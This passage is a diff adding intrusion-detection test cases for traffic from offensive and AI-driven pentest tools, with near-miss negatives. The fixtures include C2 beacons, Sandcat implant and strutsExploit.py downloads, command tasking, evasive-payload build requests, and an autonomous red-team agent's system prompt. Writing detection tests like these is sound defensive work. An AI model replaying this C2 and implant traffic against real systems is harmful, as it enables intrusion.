@@ -991,6 +991,724 @@ def define_cases(work):
          client="int", server="ext")
     http("near miss: scanner user agent going out is not the integration rule", [], get("/", ua="NeuroSploit/4.4.3 extra"), client="int", server="ext")
 
+    # ---- integrate:h-pentest
+    # ---- H-Pentest (hexian2001/H-Pentest, reviewed at 1d775a2): preprocessor credential guess, API and console
+    http("h-pentest preprocessor credential guess guest/guest", [3818201],
+         post("/login", "username=guest&password=guest", ctype="application/x-www-form-urlencoded"))
+    http("h-pentest api root response", [3818210], get("/", ua="python-requests/2.32.3", host="10.2.0.5:8000"), client="int", port=8000,
+         response=ok('{"app":"H-Pentest 2.0","version":"2.0.0","status":"running"}', ctype="application/json"))
+    http("h-pentest console page from the vite dev server", [3818211], get("/", host="10.2.0.5:5173"), client="int", port=5173,
+         response=ok('<!DOCTYPE html>\n<html lang="zh-CN">\n  <head>\n    <script type="module" src="/@vite/client"></script>\n\n    <meta charset="UTF-8">\n    <link rel="icon" type="image/svg+xml" href="/vite.svg">\n    <meta name="viewport" content="width=device-width, initial-scale=1.0">\n    <title>H-Pentest 渗透测试平台</title>\n  </head>\n  <body>\n    <div id="app"></div>\n    <script type="module" src="/src/main.ts"></script>\n  </body>\n</html>\n'))
+    http("h-pentest openapi description", [3818212], get("/openapi.json", host="10.2.0.5:8000"), client="int", port=8000,
+         response=ok('{"openapi":"3.1.0","info":{"title":"H-Pentest 2.0","description":"渗透测试可视化平台 - 全异步重构版","version":"2.0.0"},"paths":{}}', ctype="application/json"))
+    http("h-pentest swagger ui page", [3818213], get("/docs", host="10.2.0.5:8000"), client="int", port=8000,
+         response=ok('<!DOCTYPE html>\n    <html>\n    <head>\n    <link type="text/css" rel="stylesheet" href="https://cdn.jsdelivr.net/npm/swagger-ui-dist@5/swagger-ui.css">\n    <link rel="shortcut icon" href="https://fastapi.tiangolo.com/img/favicon.png">\n    <title>H-Pentest 2.0 - Swagger UI</title>\n    </head>'))
+    http("h-pentest configuration dump response", [3818214], get("/api/v1/config/all", host="10.2.0.5:8000"), client="int", port=8000,
+         response=ok('{"data":{"agent":{},"tools":{"config":{"execute_python":{"enabled":true,"description":"x","priority":1}},"stats":{"total":1,"enabled":1,"disabled":0}},"api":{"base_url":"https://open.bigmodel.cn/api/coding/paas/v4","model":"GLM-4.6"}}}', ctype="application/json"))
+    http("h-pentest task launch", [3818215],
+         post("/api/v1/tasks/", '{"target_url":"http://10.0.0.1/","mode":"ctf","max_rounds":30,"flag_submit_url":"","token":"","custom_objective":"","stealth":false,"stealth_profile":"balanced","compliance":"OWASP"}',
+              ua=BROWSER, host="10.2.0.5:8000"), client="int", port=8000)
+    http("near miss: an ordinary login form post", [], post("/login", "username=guest&password=guest&remember=1", ctype="application/x-www-form-urlencoded"))
+    http("near miss: a browser posting guest/guest", [], post("/login", "username=guest&password=guest", ua=BROWSER, ctype="application/x-www-form-urlencoded"))
+    http("near miss: another fastapi root response", [], get("/", host="10.2.0.5:8000"), client="int", port=8000,
+         response=ok('{"app":"Inventory","version":"1.0.0","status":"running"}', ctype="application/json"))
+    http("near miss: a page that names h-pentest", [], get("/blog/h-pentest", host="10.2.0.5:5173"), client="int", port=5173,
+         response=ok('<html><head><title>H-Pentest review</title></head><body>渗透测试</body></html>'))
+    http("near miss: another swagger ui page", [], get("/docs", host="10.2.0.5:8000"), client="int", port=8000,
+         response=ok('<html><head><title>Inventory API - Swagger UI</title></head></html>'))
+    http("near miss: another config endpoint", [], get("/api/v1/config/all", host="10.2.0.5:8000"), client="int", port=8000,
+         response=ok('{"data":{"agent":{"name":"x"}}}', ctype="application/json"))
+    http("near miss: another task api", [], post("/api/v1/tasks/", '{"target_url":"http://10.0.0.1/","mode":"scan"}', ua=BROWSER, host="10.2.0.5:8000"), client="int", port=8000)
+
+    # ---- integrate:hexstrike-redteam
+    # ---- integrate:hexstrike-redteam
+    # ---- Hexstrike-redteam (Yenn503/Hexstrike-redteam, reviewed at 89779b7): the /api/boaz/ routes it adds to HexStrike
+    hsr = "10.2.0.5:8888"
+    http("hexstrike-redteam boaz payload generation request", [3817901],
+         post("/api/boaz/generate-payload", '{"input_file":"payload.exe","output_file":"output/evasive.exe","loader":16,"compiler":"mingw","shellcode_type":"donut"}', host=hsr),
+         client="int", port=8888)
+    http("hexstrike-redteam boaz loader list request", [3817902], get("/api/boaz/list-loaders?category=all", ua="python-requests/2.32.3", host=hsr), client="int", port=8888)
+    http("hexstrike-redteam boaz encoder list request", [3817902], get("/api/boaz/list-encoders", ua="python-requests/2.32.3", host=hsr), client="int", port=8888)
+    http("hexstrike-redteam boaz binary analysis request", [3817903], post("/api/boaz/analyze-binary", '{"file_path":"payload.exe"}', host=hsr), client="int", port=8888)
+    http("hexstrike-redteam boaz option validation request", [3817904], post("/api/boaz/validate-options", '{"loader":16,"encoding":"uuid","compiler":"mingw"}', host=hsr), client="int", port=8888)
+    http("hexstrike-redteam boaz loader list response", [3817910], get("/status", host=hsr), client="int", port=8888,
+         response=ok('{"success":true,"loaders":{},"output":"# BOAZ Loaders\\n\\n**Loader 16**: x\\n","count":77}', ctype="application/json"))
+    http("hexstrike-redteam boaz encoder list response", [3817911], get("/status", host=hsr), client="int", port=8888,
+         response=ok('{"success":true,"encoders":{},"output":"# BOAZ Encoding Schemes\\n\\n**uuid**: x\\n","count":12}', ctype="application/json"))
+    http("hexstrike-redteam boaz payload built response", [3817912], get("/status", host=hsr), client="int", port=8888,
+         response=ok('{"success":true,"output_path":"/opt/hexstrike-ai/BOAZ_beta/output/evasive.exe","file_size":1024,'
+                     '"message":"\\u2705 Payload generated successfully at /opt/hexstrike-ai/BOAZ_beta/output/evasive.exe"}', ctype="application/json"))
+    http("hexstrike-redteam boaz not installed response", [3817913], get("/status", host=hsr), client="int", port=8888,
+         response=ok('{"success":false,"error":"BOAZ framework not found at /opt/hexstrike-ai/BOAZ_beta/Boaz.py. Please set BOAZ_PATH environment variable."}',
+                     "500 INTERNAL SERVER ERROR", ctype="application/json"))
+    http("hexstrike-redteam boaz build failed response", [3817914], get("/status", host=hsr), client="int", port=8888,
+         response=ok('{"success":false,"error":"BOAZ execution failed (exit code 1)","stdout":"","stderr":""}', "500 INTERNAL SERVER ERROR", ctype="application/json"))
+    http("hexstrike-redteam boaz binary analysis response", [3817915], get("/status", host=hsr), client="int", port=8888,
+         response=ok('{"success":true,"file_path":"/opt/hexstrike-ai/BOAZ_beta/payload.exe","size":1024,"entropy":6.1,'
+                     '"output":"# Binary Analysis: /opt/hexstrike-ai/BOAZ_beta/payload.exe\\n\\n\\ud83d\\udcc1 Size: 1024 bytes (1.00 KB)\\n\\ud83d\\udcca Entropy: 6.1000 (0-8 scale)\\n"}',
+                     ctype="application/json"))
+    http("hexstrike-redteam command api (hexstrike rule, shared route)", [3803010], post("/api/command", '{"command":"id"}', host=hsr), client="int", port=8888)
+    http("hexstrike-redteam health response (hexstrike rule, unchanged string)", [3803012], get("/health", host=hsr), client="int", port=8888,
+         response=ok('{"status":"healthy","message":"HexStrike AI Tools API Server is operational","version":"6.0.0"}', ctype="application/json"))
+    http("near miss: a GET of the payload generation route", [], get("/api/boaz/generate-payload", host=hsr), client="int", port=8888)
+    http("near miss: a documentation page that names the boaz list route", [], get("/docs/api/boaz/list-loaders.html"))
+    http("near miss: an ordinary binary analysis API", [], post("/api/analyze-binary", '{"file_path":"a.bin"}'))
+    http("near miss: an ordinary option validation API", [], post("/api/validate-options", '{"mode":"fast"}'))
+    http("near miss: a page that lists loaders", [], get("/"), response=ok("<h1># Loaders</h1><p>BOAZ</p>"))
+    http("near miss: a page that lists encoding schemes", [], get("/"), response=ok("<h1># Encoding Schemes</h1>"))
+    http("near miss: a build service that generated a payload outside BOAZ_beta", [], get("/"),
+         response=ok('{"message":"Payload generated successfully at /tmp/build/out.bin"}', ctype="application/json"))
+    http("near miss: another framework not found", [], get("/"), response=ok('{"error":"Test framework not found at /opt/x"}', ctype="application/json"))
+    http("near miss: another execution failure", [], get("/"), response=ok('{"error":"Job execution failed (exit code 1)"}', ctype="application/json"))
+    http("near miss: a binary analysis page without the entropy scale", [], get("/"), response=ok("# Binary Analysis: sample.bin\nSize: 10 bytes"))
+
+    # ---- integrate:vigilo
+    # ---- integrate:vigilo
+    # ---- Vigilo: strings from certeu/vigilo at 82c2d353 (v1.0.0). Every grey-box request carries the grey-box user agent.
+    vg = "Vigilo-Greybox/1 (authorised security test)"
+    form = "application/x-www-form-urlencoded"
+    http("vigilo grey-box crawl with the echo header", [3817401, 3817403],
+         get("/", ua=vg, headers="X-Note-Name: vigilo1a2b3c4d<e>\r\n"))
+    http("near miss: an ordinary X-Note-Name header", [], get("/notes", headers="X-Note-Name: shopping list\r\n"))
+    http("near miss: a user agent that starts with the product name", [], get("/", ua="Vigilo/2.4 (iPhone; iOS 18.1)"))
+    http("vigilo white-box preflight", [3817402],
+         b"HEAD / HTTP/1.1\r\nAccept-Encoding: identity\r\nHost: app.example.test\r\nUser-Agent: Vigilo-Preflight/1.0\r\nConnection: close\r\n\r\n",
+         ok(""))
+    http("vigilo reflection canary in a query", [3817401, 3817404], get("/search?q=vgl1a2b3c4d%22%27%3C%3Eb", ua=vg))
+    http("near miss: quote and angle brackets without the canary", [], get("/search?q=%22%27%3C%3Eb"))
+    http("vigilo reflection canary in a form body", [3817401, 3817405],
+         post("/comment", "text=vgl1a2b3c4d%22%27%3C%3Eb", ua=vg, ctype=form))
+    http("near miss: a form body with quotes and angle brackets", [], post("/comment", "text=a%22%27%3C%3Eb", ctype=form))
+    http("vigilo open redirect probe", [3817401, 3817406],
+         get("/login?next=https%3A%2F%2Fvigilo-probe-1a2b3c4d.invalid%2F", ua=vg), ok("", "302 Found"))
+    http("near miss: a page that names vigilo-probe", [], get("/docs/vigilo-probe-notes"))
+    http("vigilo cors probe origin", [3817401, 3817407],
+         get("/api/me", ua=vg, headers="Origin: https://vigilo-probe-1a2b3c4d.invalid\r\n"))
+    http("near miss: an ordinary cross-origin request to the api", [], get("/api/me", headers="Origin: https://app.example.test\r\n"))
+    http("vigilo soft-404 baseline path", [3817401, 3817408], get("/vgl-1a2b3c4d", ua=vg), ok("nf", "404 Not Found"))
+    http("near miss: a root path that starts with vgl-", [], get("/vgl-annual-report.pdf"))
+    http("vigilo login baseline in a form", [3817401, 3817409],
+         post("/login", "user=vgl1a2b3c4d&password=vgl1a2b3c4d", ua=vg, ctype=form), ok("bad", "401 Unauthorized"))
+    http("vigilo login baseline after a hidden csrf field", [3817401, 3817409],
+         post("/account/login", "csrf_token=Zx81&username=vgl0f0e0d0c&passwd=vgl0f0e0d0c", ua=vg, ctype=form))
+    http("near miss: a login whose password differs", [], post("/login", "user=vgl1a2b3c4d&password=hunter2", ctype=form))
+    http("vigilo login baseline in json", [3817401, 3817410],
+         post("/api/login", '{"user": "vgl1a2b3c4d", "password": "vgl1a2b3c4d"}', ua=vg))
+    http("near miss: a json login whose password differs", [], post("/api/login", '{"user": "vgl1a2b3c4d", "password": "secret"}'))
+    http("vigilo login baseline in a get form", [3817401, 3817411], get("/login?user=vgl1a2b3c4d&password=vgl1a2b3c4d", ua=vg))
+    http("near miss: a query with two different vgl values", [], get("/login?user=vgl1a2b3c4d&password=vgl00000000"))
+    http("vigilo callback check trigger", [3817401, 3817412],
+         get("/fetch?url=http%3A%2F%2F10.2.0.9%3A9000%2Fhook%2Fvigilo-callback-1a2b3c4d", ua=vg))
+    http("vigilo callback check negative control poll", [3817401, 3817412], get("/observe/vigilo-control-5e6f7a8b", ua=vg))
+    http("near miss: a page that names a vigilo community", [], get("/vigilo-community/events"))
+    http("vigilo inert upload", [3817401, 3817413],
+         post("/upload", "--vigilo-1a2b3c4d\r\nContent-Disposition: form-data; name=\"file\"; filename=\"vigilo-9f8e7d6c.txt\"\r\n"
+              "Content-Type: text/plain\r\n\r\nvigilo-file-5a6b7c8d\r\n--vigilo-1a2b3c4d--\r\n",
+              ua=vg, ctype="multipart/form-data; boundary=vigilo-1a2b3c4d"))
+    http("near miss: a browser upload boundary", [],
+         post("/upload", "------WebKitFormBoundary7MA4YWxk\r\nContent-Disposition: form-data; name=\"file\"; filename=\"a.txt\"\r\n\r\nx\r\n"
+              "------WebKitFormBoundary7MA4YWxk--\r\n", ctype="multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxk"))
+    http("vigilo graphql operation", [3817401, 3817414],
+         post("/graphql", '{"query":"query VigiloInvoke($id: ID!) { order(id: $id) { __typename } }","variables":{"id":"7"}}', ua=vg))
+    http("near miss: a graphql body that only mentions the name", [], post("/graphql", '{"query":"query Orders { orders { id } }","note":"VigiloInvoke"}'))
+    http("vigilo json-rpc call", [3817401, 3817415],
+         post("/rpc", '{"jsonrpc":"2.0","id":"vigilo-1a2b3c4d","method":"user.get","params":{"id":1}}', ua=vg))
+    http("near miss: a json-rpc id from an app called vigilo", [], post("/rpc", '{"jsonrpc":"2.0","id":"vigilo-app","method":"ping"}'))
+    case("vigilo network mode smtp identification", [3817416], port=25,
+         request=b"EHLO vigilo.invalid\r\nQUIT\r\n",
+         response=b"220 mail.example.test ESMTP\r\n250-mail.example.test\r\n250 STARTTLS\r\n221 Bye\r\n")
+    case("near miss: a mail client greeting from another name", [], port=25,
+         request=b"EHLO vigilo.example.test\r\nQUIT\r\n",
+         response=b"220 mail.example.test ESMTP\r\n250 mail.example.test\r\n221 Bye\r\n")
+    vigilo_csp = ("Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; font-src 'self' data:; "
+                  "img-src 'self' data: blob:; connect-src 'self'; object-src 'none'; base-uri 'self'; form-action 'self'; frame-ancestors 'none'\r\n")
+    http("vigilo web ui page", [3817417], get("/", host="vigilo.example.test"),
+         ok('<!doctype html>\n<html lang="en">\n  <head>\n    <meta charset="UTF-8" />\n    <title>Vigilo</title>\n'
+            '    <script type="module" crossorigin src="/assets/index-Bx1.js"></script>\n  </head>\n  <body><div id="root"></div></body>\n</html>\n',
+            headers="Server: nginx/1.27.5\r\nCache-Control: no-cache\r\nX-Frame-Options: DENY\r\n" + vigilo_csp))
+    http("near miss: another site titled Vigilo without the ui headers", [], get("/", host="www.example.test"),
+         ok("<html><head><title>Vigilo</title></head><body>Security cameras</body></html>"))
+    http("vigilo platform api health answer", [3817418], get("/health", host="10.2.0.5:8080", ua="curl/8.11.1"),
+         ok('{"status":"ok"}', ctype="application/json",
+            headers="server: uvicorn\r\nx-content-type-options: nosniff\r\nx-frame-options: DENY\r\nreferrer-policy: no-referrer\r\n"
+                    "content-security-policy: default-src 'none'; frame-ancestors 'none'; base-uri 'none'; form-action 'none'\r\n"),
+         port=8080)
+    http("near miss: another uvicorn api", [], get("/health", host="10.2.0.5:8080", ua="curl/8.11.1"),
+         ok('{"status":"ok"}', ctype="application/json", headers="server: uvicorn\r\n"), port=8080)
+
+    # ---- integrate:chying-agent
+    # ---- integrate:chying-agent
+    # ---- CHYing-agent: from the source (yhy0/CHYing-agent at 0d2ee81f): web terminal client markers, dashboard, model requests
+    ws_up = (b"GET /ws HTTP/1.1\r\nHost: term.example.test:7681\r\nUpgrade: websocket\r\nConnection: Upgrade\r\n"
+             b"Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\nSec-WebSocket-Version: 13\r\nSec-WebSocket-Protocol: tty\r\n"
+             b"User-Agent: Python/3.13 websockets/15.0.1\r\n\r\n")
+
+    def ws_out(text):
+        """101 answer plus one unmasked binary frame from a ttyd server: '0' + terminal output."""
+        data = b"0" + text.encode()
+        return (b"HTTP/1.1 101 Switching Protocols\r\nUpgrade: websocket\r\nConnection: Upgrade\r\n"
+                b"Sec-WebSocket-Accept: s3pPLMBiTxaQ9kYGzzhZRbK+xOo=\r\nSec-WebSocket-Protocol: tty\r\n\r\n") + bytes([0x82, len(data)]) + data
+
+    case("chying-agent web terminal codec probe echoed by ttyd", [3817701], client="int", port=7681, request=ws_up,
+         response=ws_out("root@box:/# echo __WSS_PROBE_7b3e__\r\n__WSS_PROBE_7b3e__\r\nroot@box:/# "))
+    case("chying-agent web terminal command with exit marker and delimiter", [3817702, 3817703], client="int", port=7681, request=ws_up,
+         response=ws_out("uid=0(root) gid=0(root) groups=0(root)\r\n\r\n__WSS_EXIT_c1a4__0\r\n__WSS_CMD_END_9f7a__\r\n"))
+    case("near miss: an ordinary ttyd session with similar names", [], client="int", port=7681, request=ws_up,
+         response=ws_out("root@box:/# echo __WSS_PROBE__ __WSS_EXIT__ __CMD_END__\r\n__WSS_PROBE__ __WSS_EXIT__ __CMD_END__\r\n"))
+    http("chying-agent dashboard page", [3817704], get("/", host="198.19.0.5:8080"), port=8080,
+         response=ok('<!doctype html>\n<html lang="zh-CN" class="dark">\n  <head>\n    <meta charset="UTF-8" />\n'
+                     '    <link rel="icon" type="image/svg+xml" href="/vite.svg" />\n    <title>CHYing Agent Dashboard</title>\n'
+                     '  </head>\n  <body class="bg-[#050a0e] text-gray-200 antialiased">\n    <div id="app"></div>\n  </body>\n</html>\n',
+                     headers="server: uvicorn\r\n"))
+    http("chying-agent dashboard swagger page", [3817704], get("/docs", host="198.19.0.5:8080"), port=8080,
+         response=ok("<!DOCTYPE html>\n<html>\n<head>\n<title>CHYing Agent Dashboard - Swagger UI</title>\n</head><body><div id=\"swagger-ui\"></div></body></html>",
+                     headers="server: uvicorn\r\n"))
+    http("chying-agent dashboard openapi document", [3817705], get("/openapi.json", host="198.19.0.5:8080"), port=8080,
+         response=ok('{"openapi":"3.1.0","info":{"title":"CHYing Agent Dashboard","description":"Web Dashboard API for CHYing Agent","version":"1.0.0"},"paths":{}}',
+                     headers="server: uvicorn\r\n", ctype="application/json"))
+    http("chying-agent dashboard statistics", [3817706], get("/api/dashboard/stats", host="198.19.0.5:8080"), port=8080,
+         response=ok('{"total_challenges":3,"success_count":1,"failed_count":1,"running_count":0,"pending_count":1,"total_discoveries":7,'
+                     '"total_writeups":1,"total_cost_usd":0.42,"total_input_tokens":120000,"total_output_tokens":9000,"recent_executions":[]}',
+                     headers="server: uvicorn\r\n", ctype="application/json"))
+    http("near miss: another vite app and another stats api", [], get("/api/dashboard/stats", host="198.19.0.5:8080"), port=8080,
+         response=ok('{"title":"Vite + Vue","total_discoveries":2,"recent_executions":[],"description":"Web Dashboard API"}', ctype="application/json"))
+    http("chying-agent orchestrator model request (decrypted)", [3817707, 3817708],
+         post("/coding/anthropic/v1/messages?beta=true",
+              '{"model":"glm-5","system":[{"type":"text","text":"You are CHYing Orchestrator - an autonomous security automation system for CTF, '
+              'penetration testing, and red team operations."}],"tools":[{"name":"mcp__chying__exec"},{"name":"mcp__chying__record_key_finding"}],'
+              '"messages":[]}', ua="claude-cli/2.1.98 (external, sdk-py)", host="api.lkeap.cloud.tencent.com"), client="int", server="ext", port=80)
+    http("near miss: a model request with other agent and tool names", [],
+         post("/v1/messages", '{"model":"glm-5","system":"You are an autonomous security assistant.","tools":[{"name":"mcp__chrome__exec"},'
+              '{"name":"record_key_finding"}],"messages":[]}', ua="claude-cli/2.1.98 (external, sdk-py)", host="api.lkeap.cloud.tencent.com"),
+         client="int", server="ext", port=80)
+
+    # ---- integrate:incalmo
+    # ---- Incalmo: C2 server answers, the Sandcat contact protocol it serves, and its operator API, from the source at 8cd02e0e
+    c2 = "198.19.0.5:8888"
+    http("incalmo c2 root json", [3818301], get("/", ua="curl/8.5.0", host=c2),
+         ok('{"message":"Incalmo C2 Server API"}\n', ctype="application/json"), port=8888)
+    http("near miss: another flask api root", [], get("/", ua="curl/8.5.0", host=c2),
+         ok('{"message":"Inventory Server API"}\n', ctype="application/json"), port=8888)
+    http("incalmo c2 health json (debug mode indent)", [3818302], get("/health", host=c2),
+         ok('{\n  "broker": null,\n  "celery_workers": 1,\n  "running_strategies": 0,\n  "server": "Flask + Celery",\n  "status": "healthy"\n}\n',
+            ctype="application/json"), port=8888)
+    http("near miss: another flask and celery health", [], get("/health", host=c2),
+         ok('{"server":"Flask + Celery","status":"healthy","workers":2}', ctype="application/json"), port=8888)
+    http("incalmo console page", [3818310], get("/", host="10.2.0.5:3000"),
+         ok('<!DOCTYPE html><html lang="en"><head><meta charset="utf-8" /><title>Incalmo</title></head><body><div id="root"></div></body></html>'),
+         port=3000)
+    http("near miss: a page whose title only starts with Incalmo", [], get("/", host="10.2.0.5:3000"),
+         ok('<html><head><title>Incalmo Docs</title></head><body></body></html>'), port=3000)
+    beacon = "eyJwYXciOiAicWZ5cG1sIiwgInJlc3VsdHMiOiBbXX0="
+    answer = "eyJwYXciOiAiYWJjZDEyMzQiLCAic2xlZXAiOiAzLCAid2F0Y2hkb2ciOiA2MCwgImluc3RydWN0aW9ucyI6ICJbXSJ9"
+    http("sandcat beacon and the incalmo answer", [3818303, 3818304],
+         post("/beacon", beacon, ua="test-client", host=c2, ctype="application/octet-stream"),
+         ok(answer, ctype="text/html; charset=utf-8"), client="int", server="ext", port=8888)
+    http("near miss: beacon path with a plain json body and answer", [],
+         post("/beacon", '{"paw":"x"}', ua="test-client", host=c2), ok('{"ok":true}', ctype="application/json"),
+         client="int", server="ext", port=8888)
+    http("near miss: base64 json answer that does not start with paw", [],
+         post("/api/beacon", beacon, ua="test-client", host=c2), ok("eyJzdGF0dXMiOiAib2sifQ==", ctype="text/html; charset=utf-8"),
+         client="int", server="ext", port=8888)
+    http("incalmo implant pulled with curl over ssh", [3818305],
+         post("/file/download", "", ua="curl/8.5.0", host=c2, headers="file:sandcat.go\r\nplatform:linux\r\n", ctype="application/x-www-form-urlencoded"),
+         ok("ELF", ctype="application/octet-stream", headers='Content-Disposition: attachment; filename="sandcat.go"\r\nFILENAME: sandcat.go\r\n'),
+         client="int", server="ext", port=8888)
+    http("incalmo implant copy for scp fetched by an implant", [3818305, 3818308],
+         post("/file/download", "", ua="test-client", host=c2, headers="File: sandcat.go-linux\r\n"),
+         ok("ELF", ctype="application/octet-stream"), client="int", server="ext", port=8888)
+    http("near miss: sandcat named in a GET query, not a header", [],
+         get("/file/download?name=sandcat.go", ua="curl/8.5.0", host=c2), client="int", server="ext", port=8888)
+    http("incalmo agent download route", [3818306],
+         post("/agent/download", "", ua="test-client", host=c2, headers="File: sandcat.go\r\n"),
+         ok("ELF", ctype="application/octet-stream"), client="int", server="ext", port=8888)
+    http("near miss: agent downloads path without a File header", [],
+         post("/agent/downloads/report", "{}", ua="test-client", host=c2), client="int", server="ext", port=8888)
+    http("incalmo per-command script fetched by an implant", [3818307],
+         post("/file/download", "", ua="test-client", host=c2, headers="File: dynamic_payload_8888_abcd1234.sh\r\n"),
+         ok("#!/bin/sh\n", ctype="application/octet-stream"), client="int", server="ext", port=8888)
+    http("near miss: another script name on a download route", [],
+         post("/file/download", "", ua="test-client", host=c2, headers="File: report_payload.sh\r\n"),
+         client="int", server="ext", port=8888)
+    http("incalmo struts exploit fetched by an implant", [3818308],
+         post("/file/download", "", ua="test-client", host=c2, headers="File: strutsExploit.py\r\n"),
+         client="int", server="ext", port=8888)
+    http("incalmo kill script fetched by an implant", [3818308],
+         post("/file/download", "", ua="test-client", host=c2, headers="File: kill_agent.sh\r\n"),
+         client="int", server="ext", port=8888)
+    http("near miss: a generic exploit name on a download route", [],
+         post("/file/download", "", ua="test-client", host=c2, headers="File: exploit.py\r\n"),
+         client="int", server="ext", port=8888)
+    http("incalmo llm agent action poll", [3818311], get("/get_llm_agent_action", ua="python-requests/2.32.3", host=c2), port=8888)
+    http("incalmo llm agent log stream", [3818311], get("/stream_llm_agent_logs", host=c2), port=8888)
+    http("near miss: llm agent path under another prefix", [], get("/api/get_llm_agent_actions_report", host=c2), port=8888)
+    http("incalmo strategy start", [3818312],
+         post("/startup", '{"name": "test", "strategy": {"planning_llm": "haiku3_5_strategy", "execution_llm": "claude-3.5-haiku", '
+              '"abstraction": "incalmo"}, "environment": "equifax_large", "c2c_server": "http://host.docker.internal:8888"}', host=c2),
+         ok('{"status": "success"}', status="202 ACCEPTED", ctype="application/json"), port=8888)
+    http("near miss: another startup request", [], post("/startup", '{"name": "x", "strategy": "fast"}', host=c2), port=8888)
+    http("incalmo environment state report", [3818313],
+         post("/update_environment_state", '{"hosts": [{"host_id": "h1", "ip_addresses": ["10.2.0.9"]}]}', host=c2), port=8888)
+    http("near miss: environment state read with GET", [], get("/update_environment_state", host=c2), port=8888)
+    http("incalmo command tasking", [3818314],
+         post("/send_command", '{"agent": "abcd1234", "command": "nmap -sV --version-light -oX - 10.2.0.9", "payloads": []}', host=c2),
+         port=8888)
+    http("incalmo manual command tasking", [3818314],
+         post("/send_manual_command", '{"agent": "abcd1234", "command": "id"}', host=c2), port=8888)
+    http("near miss: another send path with the same body", [],
+         post("/send_commands", '{"agent": "abcd1234", "command": "id"}', host=c2), port=8888)
+
+    # ---- integrate:pentest-copilot
+    # ---- integrate:pentest-copilot
+    # ---- Pentest Copilot (bugbasesecurity/pentest-copilot, reviewed at cd512edd): its own requests and an exposed console
+    http("pentest copilot ctfd login page fetch", [3817501], get("/login", ua="PentestCopilot/1.0", host="ctf.example.test"), client="int", server="ext")
+    http("near miss: a user agent that only mentions PentestCopilot", [], get("/login", ua="Mozilla/5.0 (compatible; PentestCopilot/1.0)", host="ctf.example.test"),
+         client="int", server="ext")
+    http("pentest copilot file upload to mythic", [3817502],
+         post("/api/v1.4/task_upload_file_webhook", "--b\r\nContent-Disposition: form-data; name=\"file\"; filename=\"x.bin\"\r\n\r\nAAAA\r\n--b--\r\n",
+              host="10.9.0.5:7443", headers="Apitoken: x\r\nMythicSource: pentest-copilot\r\n", ctype="multipart/form-data; boundary=b"),
+         ok('{"status":"success"}', ctype="application/json"), client="int", server="ext", port=7443)
+    http("near miss: a mythic upload from another client", [],
+         post("/api/v1.4/task_upload_file_webhook", "--b--\r\n", host="10.9.0.5:7443", headers="Apitoken: x\r\nMythicSource: scripting\r\n",
+              ctype="multipart/form-data; boundary=b"), ok('{"status":"success"}', ctype="application/json"), client="int", server="ext", port=7443)
+    http("pentest copilot mcp bearer token", [3817503],
+         post("/mcp", '{"jsonrpc":"2.0","id":1,"method":"tools/list"}', host="localhost:8080",
+              headers="Authorization: Bearer pc_mcp_0123456789abcdef0123456789abcdef0123456789abcdef\r\n"), client="int", port=8080)
+    http("near miss: a bearer token with the prefix but the wrong length", [],
+         post("/mcp", '{"jsonrpc":"2.0","id":1,"method":"tools/list"}', host="localhost:8080", headers="Authorization: Bearer pc_mcp_abc123\r\n"),
+         client="int", port=8080)
+    http("pentest copilot console page", [3817510], get("/"), client="int", port=3000,
+         response=ok('<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"/><title>Pentest Copilot - Bugbase</title>'
+                     '<meta name="robots" content="noindex, nofollow"/><link rel="icon" href="/favicon.ico"/></head><body></body></html>'))
+    http("near miss: another copilot console page", [], get("/"), client="int", port=3000,
+         response=ok('<!DOCTYPE html><html lang="en"><head><title>Pentest Copilot Notes</title></head><body></body></html>'))
+    http("pentest copilot console page, PRODUCTION build", [3817511], get("/"), client="int", port=3000,
+         response=ok('<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"/><title>Pentest Copilot by BugBase</title></head><body></body></html>'))
+    http("near miss: a BugBase page with another title", [], get("/"), client="int", port=3000,
+         response=ok('<!DOCTYPE html><html lang="en"><head><title>BugBase - Bug Bounty Platform</title></head><body></body></html>'))
+    http("pentest copilot console that nobody has claimed", [3817512, 3817513], get("/api/auth/registration-status"), client="int", port=8080,
+         response=ok('{"registrationOpen":true}', ctype="application/json"))
+    http("pentest copilot console already claimed fires the request rule only", [3817512], get("/api/auth/registration-status"), client="int", port=8080,
+         response=ok('{"registrationOpen":false}', ctype="application/json"))
+    http("near miss: another app's sign-up status", [], get("/api/signup/status"), client="int", port=8080,
+         response=ok('{"registrationOpen":true,"mode":"invite"}', ctype="application/json"))
+    http("pentest copilot registration refused", [3817514],
+         post("/api/auth/register", '{"name":"a","email":"a@example.test","password":"aaaaaaaa"}', host="10.2.0.5:8080"), client="int", port=8080,
+         response=ok('{"message":"Registration is closed. Sign in with the installation owner account."}', "403 Forbidden", ctype="application/json"))
+    http("near miss: a generic registration closed message", [],
+         post("/api/auth/register", '{"email":"a@example.test"}', host="10.2.0.5:8080"), client="int", port=8080,
+         response=ok('{"message":"Registration is closed."}', "403 Forbidden", ctype="application/json"))
+    http("pentest copilot owner-only refusal", [3817515], get("/api/user/ssh-profiles", host="10.2.0.5:8080"), client="int", port=8080,
+         response=ok('{"message":"Only the installation owner can manage host-level integrations and credentials"}', "403 Forbidden", ctype="application/json"))
+    http("near miss: a generic owner-only refusal", [], get("/api/settings", host="10.2.0.5:8080"), client="int", port=8080,
+         response=ok('{"message":"Only the owner can manage integrations"}', "403 Forbidden", ctype="application/json"))
+    http("pentest copilot mcp endpoint reached by a remote name", [3817516],
+         post("/mcp", '{"jsonrpc":"2.0","id":1,"method":"initialize"}', host="copilot.example.test:8080"), client="int", port=8080,
+         response=ok('{"message":"Forbidden host header for local MCP endpoint"}', "403 Forbidden", ctype="application/json"))
+    http("near miss: another server refusing a host header", [],
+         post("/mcp", '{"jsonrpc":"2.0","id":1,"method":"initialize"}', host="copilot.example.test:8080"), client="int", port=8080,
+         response=ok('{"message":"Forbidden host header"}', "403 Forbidden", ctype="application/json"))
+    http("pentest copilot api health", [3817517], get("/api/healthcheck", host="10.2.0.5:8080"), client="int", port=8080,
+         response=ok('{"status":"ready","mongodb":"ready","redis":"ready"}', ctype="application/json"))
+    http("pentest copilot api health while starting", [3817517], get("/api/healthcheck", host="10.2.0.5:8080"), client="int", port=8080,
+         response=ok('{"status":"starting","mongodb":"ready","redis":"unavailable"}', "503 Service Unavailable", ctype="application/json"))
+    http("near miss: another health response with redis", [], get("/api/healthcheck", host="10.2.0.5:8080"), client="int", port=8080,
